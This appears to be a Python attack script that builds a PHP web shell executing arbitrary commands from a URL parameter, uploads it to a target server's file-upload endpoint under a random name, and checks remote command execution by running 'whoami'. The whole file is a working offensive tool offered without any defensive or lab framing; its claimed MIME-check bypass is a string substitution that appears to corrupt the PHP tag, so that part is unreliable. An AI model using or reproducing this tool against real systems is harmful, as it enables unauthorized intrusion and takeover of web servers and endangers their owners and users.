import requests
import random
import string
import os

class WebShellUploadAdvanced:
    def __init__(self, target_url, upload_param, headers=None):
        self.target_url = target_url
        self.upload_param = upload_param
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}
    
    def generate_shell(self):
        """
        Generate a simple PHP web shell.
        """
        shell_code = """<?php
        if(isset($_GET['cmd'])){
            echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
        }
        ?>
        """
        return shell_code

    def random_filename(self, extension="php"):
        """
        Generate a random filename for the web shell.
        """
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.' + extension

    def bypass_mime_check(self, file_data):
        """
        Attempt to bypass MIME type validation by obfuscating the payload.
        """
        obfuscated_payload = file_data.replace("<?php", "<?p<?php")
        return obfuscated_payload

    def upload_shell(self, shell_code, filename):
        """
        Upload the generated shell to the target server.
        """
        files = {
            self.upload_param: (filename, shell_code, 'application/octet-stream')
        }

        try:
            response = requests.post(self.target_url, files=files, headers=self.headers)
            if response.status_code == 200:
                print(f"Shell uploaded successfully: {filename}")
                return True
            else:
                print(f"Failed to upload shell. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error during upload: {e}")
        return False

    def check_shell_access(self, uploaded_shell_url):
        """
        Check if the uploaded shell can be accessed and used to execute commands.
        """
        try:
            response = requests.get(uploaded_shell_url, headers=self.headers, params={'cmd': 'whoami'})
            if "www-data" in response.text or "root" in response.text:
                print(f"Web shell is accessible at: {uploaded_shell_url}")
                return True
            else:
                print("Failed to execute command through web shell.")
        except requests.exceptions.RequestException as e:
            print(f"Error accessing web shell: {e}")
        return False

    def execute_web_shell_upload(self):
        """
        Perform the full process of uploading a web shell.
        """
        print(f"Attempting to upload web shell to {self.target_url}")

        # Generate the web shell and filename
        shell_code = self.generate_shell()
        filename = self.random_filename()

        # Optionally bypass MIME check
        shell_code = self.bypass_mime_check(shell_code)

        # Upload the shell
        if self.upload_shell(shell_code, filename):
            uploaded_shell_url = f"{self.target_url}/{filename}"
            # Check if the shell is accessible
            self.check_shell_access(uploaded_shell_url)
